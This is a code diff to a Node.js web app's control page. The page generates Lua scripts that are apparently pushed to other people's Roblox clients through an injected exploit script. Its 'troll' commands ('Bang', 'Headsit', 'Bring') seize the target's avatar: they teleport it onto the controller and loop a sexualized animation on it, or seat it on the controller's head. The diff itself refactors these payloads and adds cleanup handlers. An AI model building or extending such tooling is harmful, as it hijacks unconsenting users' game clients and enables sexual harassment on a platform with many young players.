@@ -2438,10 +2438,26 @@ app.get("/control", (req, res) => {
   ].join('\\n');
 
   var SCRIPT_UNBANG = [
-    'if _G._IY_BangTrack then pcall(function() _G._IY_BangTrack:Stop() end) _G._IY_BangTrack:Destroy() _G._IY_BangTrack = nil end',
+    'if _G._IY_BangTrack then pcall(function() _G._IY_BangTrack:Stop() end) pcall(function() _G._IY_BangTrack:Destroy() end) _G._IY_BangTrack = nil end',
     'if _G._IY_BangAnim then pcall(function() _G._IY_BangAnim:Destroy() end) _G._IY_BangAnim = nil end',
     'if _G._IY_BangLoop then pcall(function() _G._IY_BangLoop:Disconnect() end) _G._IY_BangLoop = nil end'
   ].join('\\n');
+
+  function findPlayerLua(varName, ctrlName){
+    // Lua snippet that sets varName to the Players player matching ctrlName (username or display name)
+    return [
+      'local ' + varName + ' = nil',
+      'do',
+      '  local want = string.lower("' + ctrlName + '")',
+      '  for _, plr in ipairs(Players:GetPlayers()) do',
+      '    if string.lower(plr.Name) == want or string.lower(plr.DisplayName) == want then',
+      '      ' + varName + ' = plr',
+      '      break',
+      '    end',
+      '  end',
+      'end'
+    ];
+  }
 
   function buildBangScript(ctrlName){
     return [
@@ -2452,89 +2468,96 @@ app.get("/control", (req, res) => {
       'if not char then return end',
       'local hum = char:FindFirstChildOfClass("Humanoid")',
       'if not hum then return end',
-      'if _G._IY_BangTrack then pcall(function() _G._IY_BangTrack:Stop() end) _G._IY_BangTrack:Destroy() _G._IY_BangTrack = nil end',
-      'if _G._IY_BangLoop then pcall(function() _G._IY_BangLoop:Disconnect() end) _G._IY_BangLoop = nil end',
+      'if _G._IY_BangTrack then pcall(function() _G._IY_BangTrack:Stop() end) pcall(function() _G._IY_BangTrack:Destroy() end) _G._IY_BangTrack = nil end',
+      'if _G._IY_BangLoop then pcall(function() _G._IY_BangLoop:Disconnect() end) _G._IY_BangLoop = nil end'
+    ].concat(findPlayerLua('controller', ctrlName)).concat([
+      'if not controller then return end',
       'local animator = hum:FindFirstChildOfClass("Animator")',
       'if not animator then animator = Instance.new("Animator") animator.Parent = hum end',
       'local anim = Instance.new("Animation")',
       'if hum.RigType == Enum.HumanoidRigType.R15 then anim.AnimationId = "rbxassetid://5918726674" else anim.AnimationId = "rbxassetid://148840371" end',
       'local ok, track = pcall(function() return animator:LoadAnimation(anim) end)',
-      'if not ok or not track then return end',
-      'track.Priority = Enum.AnimationPriority.Action',
-      'track.Looped = true',
-      'pcall(function() track:Play(0.1, 1, 1) end)',
-      'pcall(function() track:AdjustSpeed(3) end)',
-      '_G._IY_BangTrack = track',
-      '_G._IY_BangAnim = anim',
-      'local want = string.lower("' + ctrlName + '")',
-      'local controller = nil',
-      'for _, plr in ipairs(Players:GetPlayers()) do',
-      '  if string.lower(plr.Name) == want or string.lower(plr.DisplayName) == want then controller = plr break end',
+      'if ok and track then',
+      '  track.Priority = Enum.AnimationPriority.Action',
+      '  track.Looped = true',
+      '  pcall(function() track:Play(0.1, 1, 1) end)',
+      '  pcall(function() track:AdjustSpeed(3) end)',
+      '  _G._IY_BangTrack = track',
+      '  _G._IY_BangAnim = anim',
       'end',
-      'if not controller then return end',
       'local offset = CFrame.new(0, 0, 1.1)',
       '_G._IY_BangLoop = RunService.Stepped:Connect(function()',
-      '    local myChar = lp.Character',
-      '    if not myChar then return end',
-      '    local myRoot = myChar:FindFirstChild("HumanoidRootPart")',
-      '    if not myRoot then return end',
-      '    local cChar = controller.Character',
-      '    if not cChar then return end',
-      '    local cTorso = cChar:FindFirstChild("Torso") or cChar:FindFirstChild("UpperTorso") or cChar:FindFirstChild("LowerTorso") or cChar:FindFirstChild("HumanoidRootPart")',
-      '    if not cTorso then return end',
-      '    myRoot.CFrame = cTorso.CFrame * offset',
+      '  local myChar = lp.Character',
+      '  if not myChar then return end',
+      '  local myRoot = myChar:FindFirstChild("HumanoidRootPart")',
+      '  if not myRoot then return end',
+      '  local cChar = controller.Character',
+      '  if not cChar then return end',
+      '  local cTorso = cChar:FindFirstChild("Torso") or cChar:FindFirstChild("UpperTorso") or cChar:FindFirstChild("LowerTorso") or cChar:FindFirstChild("HumanoidRootPart")',
+      '  if not cTorso then return end',
+      '  myRoot.CFrame = cTorso.CFrame * offset',
       'end)'
-    ].join('\\n');
+    ]).join('\\n');
   }
 
   function buildHeadsitScript(ctrlName){
     return [
       'local Players = game:GetService("Players")',
       'local RunService = game:GetService("RunService")',
-      'local lp = Players.LocalPlayer',
-      'local want = string.lower("' + ctrlName + '")',
-      'local me = nil',
-      'for _, plr in ipairs(Players:GetPlayers()) do',
-      '  if string.lower(plr.Name) == want or string.lower(plr.DisplayName) == want then me = plr break end',
-      'end',
+      'local UserInputService = game:GetService("UserInputService")',
+      'local lp = Players.LocalPlayer'
+    ].concat(findPlayerLua('me', ctrlName)).concat([
       'if not me or not me.Character then return end',
       'if not lp.Character then return end',
       'local hum = lp.Character:FindFirstChildOfClass("Humanoid")',
       'if not hum then return end',
       'hum.Sit = true',
-      'if _G._IY_HeadsitConn then _G._IY_HeadsitConn:Disconnect() end',
+      'if _G._IY_HeadsitConn then pcall(function() _G._IY_HeadsitConn:Disconnect() end) _G._IY_HeadsitConn = nil end',
+      'if _G._IY_HeadsitJump then pcall(function() _G._IY_HeadsitJump:Disconnect() end) _G._IY_HeadsitJump = nil end',
+      'if _G._IY_HeadsitState then pcall(function() _G._IY_HeadsitState:Disconnect() end) _G._IY_HeadsitState = nil end',
+      'local function stopHeadsit()',
+      '  if _G._IY_HeadsitConn then pcall(function() _G._IY_HeadsitConn:Disconnect() end) _G._IY_HeadsitConn = nil end',
+      '  if _G._IY_HeadsitJump then pcall(function() _G._IY_HeadsitJump:Disconnect() end) _G._IY_HeadsitJump = nil end',
+      '  if _G._IY_HeadsitState then pcall(function() _G._IY_HeadsitState:Disconnect() end) _G._IY_HeadsitState = nil end',
+      '  local h = lp.Character and lp.Character:FindFirstChildOfClass("Humanoid")',
+      '  if h then pcall(function() h.Sit = false end) end',
+      'end',
+      '_G._IY_HeadsitJump = UserInputService.JumpRequest:Connect(function()',
+      '  stopHeadsit()',
+      'end)',
+      '_G._IY_HeadsitState = hum.StateChanged:Connect(function(_, newState)',
+      '  if newState == Enum.HumanoidStateType.Jumping or newState == Enum.HumanoidStateType.Freefall then',
+      '    stopHeadsit()',
+      '  end',
+      'end)',
       '_G._IY_HeadsitConn = RunService.Heartbeat:Connect(function()',
-      '    local controllerChar = me.Character',
-      '    local myChar = lp.Character',
-      '    if not controllerChar or not myChar then _G._IY_HeadsitConn:Disconnect() return end',
-      '    local controllerRoot = controllerChar:FindFirstChild("HumanoidRootPart")',
-      '    local myRoot = myChar:FindFirstChild("HumanoidRootPart")',
-      '    local myHum = myChar:FindFirstChildOfClass("Humanoid")',
-      '    if controllerRoot and myRoot and myHum and myHum.Sit then',
-      '        myRoot.CFrame = controllerRoot.CFrame * CFrame.new(0, 1.6, 0.4)',
-      '    else',
-      '        _G._IY_HeadsitConn:Disconnect()',
-      '    end',
+      '  local controllerChar = me.Character',
+      '  local myChar = lp.Character',
+      '  if not controllerChar or not myChar then stopHeadsit() return end',
+      '  local controllerRoot = controllerChar:FindFirstChild("HumanoidRootPart")',
+      '  local myRoot = myChar:FindFirstChild("HumanoidRootPart")',
+      '  local myHum = myChar:FindFirstChildOfClass("Humanoid")',
+      '  if not (controllerRoot and myRoot and myHum and myHum.Sit) then',
+      '    stopHeadsit()',
+      '    return',
+      '  end',
+      '  myRoot.CFrame = controllerRoot.CFrame * CFrame.new(0, 1.6, 0.4)',
       'end)'
-    ].join('\\n');
+    ]).join('\\n');
   }
 
   function buildBringScript(ctrlName){
     return [
       'local Players = game:GetService("Players")',
-      'local want = string.lower("' + ctrlName + '")',
-      'local me = nil',
-      'for _, plr in ipairs(Players:GetPlayers()) do',
-      '  if string.lower(plr.Name) == want or string.lower(plr.DisplayName) == want then me = plr break end',
-      'end',
+      'local lp = Players.LocalPlayer'
+    ].concat(findPlayerLua('me', ctrlName)).concat([
       'if not me or not me.Character then return end',
       'local myHRP = me.Character:FindFirstChild("HumanoidRootPart")',
       'if not myHRP then return end',
-      'local lp = game:GetService("Players").LocalPlayer',
       'if not lp.Character then return end',
       'local h = lp.Character:FindFirstChild("HumanoidRootPart")',
       'if h then h.CFrame = myHRP.CFrame * CFrame.new(0, 3, 0) end'
-    ].join('\\n');
+    ]).join('\\n');
   }
 
   function send(msg){
@@ -2862,7 +2885,7 @@ app.get("/control", (req, res) => {
       <div class="ctrl-panel" data-panel="troll">
         <div id="trollTargetInfo" class="ctrl-target-bar empty">No target selected.</div>
 
-        <div class="ctrl-hint" style="margin-top:0">Bang, Headsit, and Bring find you in the target's game by username <b id="trollSelfName">—</b>. Just be in the same Roblox server — no hubscript on your account.</div>
+        <div class="ctrl-hint" style="margin-top:0">Bang, Headsit, and Bring find you in the target's server by username <b id="trollSelfName">—</b>. Be in the same Roblox server (hubscript not needed on your account).</div>
 
         <div class="ctrl-label">Character</div>
         <div class="ctrl-grid">
